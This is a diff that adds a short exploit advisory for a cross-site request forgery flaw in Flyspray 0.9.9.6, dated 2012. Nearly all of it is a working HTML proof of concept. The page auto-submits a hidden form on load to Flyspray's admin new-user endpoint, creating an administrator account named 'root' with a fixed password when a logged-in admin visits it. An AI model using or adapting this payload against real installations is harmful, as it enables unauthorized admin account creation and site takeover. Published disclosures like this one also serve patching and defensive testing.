@@ -1,0 +1,25 @@
+#Exploit Title: Flyspray 0.9.9.6 CSRF Vulnerability
+#Date: 06 Feb 2012
+#Author: Vaibhav Gupta
+#Software Link: http://flyspray.org/flyspray-0.9.9.6.zip
+#Version: 0.9.9.6
++---+[CSRF Add Admin Account after authentication]+---+
+<html>
+<body onload="javascript:document.forms[0].submit()">
+<H2>CSRF Exploit to add ADMIN account</H2>
+<form method="POST" name="form0" action="http://127.0.0.1:80/flyspray-0.9.9.6/index.php?do=admin&area=newuser">
+<input type="hidden" name="action" value="admin.newuser"/>
+<input type="hidden" name="do" value="admin"/>
+<input type="hidden" name="area" value="newuser"/>
+<input type="hidden" name="user_name" value="root"/>
+<input type="hidden" name="user_pass" value="12345678"/>
+<input type="hidden" name="user_pass2" value="12345678"/>
+<input type="hidden" name="real_name" value="root"/>
+<input type="hidden" name="email_address" value="root@root.com"/>
+<input type="hidden" name="jabber_id" value=""/>
+<input type="hidden" name="notify_type" value="0"/>
+<input type="hidden" name="time_zone" value="0"/>
+<input type="hidden" name="group_in" value="1"/>
+</form>
+</body>
+</html>
